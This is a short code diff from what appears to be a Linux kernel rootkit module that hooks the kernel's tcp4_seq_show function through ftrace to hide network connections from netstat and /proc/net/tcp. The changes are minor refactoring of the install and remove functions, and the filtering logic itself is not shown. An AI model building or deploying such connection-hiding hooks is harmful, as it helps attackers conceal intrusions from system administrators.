@@ -1,5 +1,4 @@
 #include "hide_proc_net.h"
-//#include "ftrace_helper.h"
 struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
 
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
@@ -15,7 +14,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
     return ret;
 
 }
-static int __init netstat_hide(void)
+static int netstat_hide(void)
 {
     int ret;
     ret = install_hook(&tcp4_hook);
@@ -24,7 +23,7 @@ static int __init netstat_hide(void)
 
     return 0;
 }
-static void __exit unhide(void)
+static void unhide(void)
 {
     fh_remove_hook(&tcp4_hook);
 }
